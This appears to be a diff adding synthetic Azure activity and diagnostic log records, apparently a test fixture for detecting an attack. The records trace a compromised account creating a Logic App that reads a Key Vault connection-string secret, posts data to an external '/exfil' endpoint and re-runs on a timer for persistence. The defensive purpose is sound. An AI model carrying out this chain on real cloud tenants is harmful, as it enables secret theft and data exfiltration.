@@ -1,0 +1,90 @@
+[
+  {
+    "_comment": "Attacker creates a Logic App",
+    "TimeGenerated": "2026-03-13T02:15:00Z",
+    "Type": "AzureActivity",
+    "Caller": "compromised-user@contoso.com",
+    "CallerIpAddress": "45.33.32.156",
+    "OperationNameValue": "Microsoft.Logic/workflows/write",
+    "CategoryValue": "Administrative",
+    "ActivityStatusValue": "Success",
+    "ResourceGroup": "rg-production",
+    "SubscriptionId": "sub-guid-001",
+    "ResourceId": "/subscriptions/sub-guid-001/resourceGroups/rg-production/providers/Microsoft.Logic/workflows/data-sync-backup",
+    "Properties": {
+      "statusCode": "Created",
+      "serviceRequestId": "req-logic-001"
+    }
+  },
+  {
+    "_comment": "Attacker assigns managed identity to Logic App",
+    "TimeGenerated": "2026-03-13T02:16:30Z",
+    "Type": "AzureActivity",
+    "Caller": "compromised-user@contoso.com",
+    "CallerIpAddress": "45.33.32.156",
+    "OperationNameValue": "Microsoft.Logic/workflows/write",
+    "CategoryValue": "Administrative",
+    "ActivityStatusValue": "Success",
+    "ResourceGroup": "rg-production",
+    "ResourceId": "/subscriptions/sub-guid-001/resourceGroups/rg-production/providers/Microsoft.Logic/workflows/data-sync-backup",
+    "Properties": {
+      "statusCode": "OK",
+      "serviceRequestId": "req-logic-002",
+      "entity": {
+        "identity": {
+          "type": "SystemAssigned",
+          "principalId": "mi-principal-logic-001",
+          "tenantId": "contoso-tenant-id"
+        }
+      }
+    }
+  },
+  {
+    "_comment": "Logic App managed identity accesses Key Vault",
+    "TimeGenerated": "2026-03-13T02:20:00Z",
+    "Type": "AzureDiagnostics",
+    "ResourceProvider": "MICROSOFT.LOGIC",
+    "Category": "WorkflowRuntime",
+    "resource_workflowName_s": "data-sync-backup",
+    "resource_actionName_s": "Get_Secret_from_KeyVault",
+    "resource_runId_s": "run-001",
+    "status_s": "Succeeded",
+    "resource_triggerOutput_s": "{\"uri\": \"https://contoso-prod-kv.vault.azure.net/secrets/db-connection-string\"}"
+  },
+  {
+    "_comment": "Logic App exfiltrates data via HTTP connector",
+    "TimeGenerated": "2026-03-13T02:20:45Z",
+    "Type": "AzureDiagnostics",
+    "ResourceProvider": "MICROSOFT.LOGIC",
+    "Category": "WorkflowRuntime",
+    "resource_workflowName_s": "data-sync-backup",
+    "resource_actionName_s": "HTTP_POST_External",
+    "resource_runId_s": "run-001",
+    "status_s": "Succeeded",
+    "resource_triggerOutput_s": "{\"uri\": \"https://45.33.32.156:8443/exfil\", \"method\": \"POST\"}"
+  },
+  {
+    "_comment": "Timer trigger - Logic App runs again (persistence)",
+    "TimeGenerated": "2026-03-13T08:20:00Z",
+    "Type": "AzureActivity",
+    "Caller": "data-sync-backup",
+    "CallerIpAddress": "",
+    "OperationNameValue": "Microsoft.Logic/workflows/triggers/run/action",
+    "CategoryValue": "Administrative",
+    "ActivityStatusValue": "Success",
+    "ResourceGroup": "rg-production",
+    "ResourceId": "/subscriptions/sub-guid-001/resourceGroups/rg-production/providers/Microsoft.Logic/workflows/data-sync-backup"
+  },
+  {
+    "_comment": "Timer trigger - Logic App runs again 6 hours later",
+    "TimeGenerated": "2026-03-13T14:20:00Z",
+    "Type": "AzureActivity",
+    "Caller": "data-sync-backup",
+    "CallerIpAddress": "",
+    "OperationNameValue": "Microsoft.Logic/workflows/triggers/run/action",
+    "CategoryValue": "Administrative",
+    "ActivityStatusValue": "Success",
+    "ResourceGroup": "rg-production",
+    "ResourceId": "/subscriptions/sub-guid-001/resourceGroups/rg-production/providers/Microsoft.Logic/workflows/data-sync-backup"
+  }
+]
